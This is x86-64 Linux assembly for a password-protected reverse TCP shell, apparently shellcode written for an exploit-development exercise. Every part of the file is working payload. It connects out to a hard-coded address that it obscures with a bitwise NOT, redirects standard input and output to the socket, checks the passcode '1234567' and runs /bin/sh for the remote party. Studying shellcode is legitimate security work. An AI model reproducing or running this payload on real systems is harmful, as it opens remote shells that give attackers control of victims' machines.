global _start

_start:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

        push 41
        pop rax
        push 2
        pop rdi
        push 1
        pop rsi
        cdq
        syscall

        ; copy socket descriptor to rdi for future use
        xchg rdi, rax

        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
        ; bzero(&server.sin_zero, 8)

        push rdx ; already zeroed by "cdq" instruction
        mov rbx, 0xfeffff80a3eefffd
        not rbx
        push rbx

        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	push rsp
	pop rsi
        mov al,42
        mov dl,16
        syscall

        ; duplicate sockets

        ; dup2 (new, old)

        push 3
        pop rsi
dup2cycle:
        mov al, 33
        dec esi
        syscall
        loopnz dup2cycle

        ; read passcode
        ; xor rax,rax - already zeroed out by prev cycle
        xor rdi,rdi
        push rax
	push rsp
	pop rsi
        mov dl,8
        syscall

        ; Authentication with password "1234567"
        xchg rcx,rax
        mov rbx,0x0a37363534333231
        push rbx
	push rsp
	pop rdi
        repe cmpsb
        jnz wrong_pwd

        ; execve stack-method

        push 59
        pop rax
        cdq ; extends rax sign into rdx, zeroing it out
        push rdx
        mov rbx, 0x68732f6e69622f2f
        push rbx
	push rsp
	pop rdi
        push rdx
	push rsp
	pop rdx
        push rdi
	push rsp
	pop rsi
        syscall

wrong_pwd:
        nop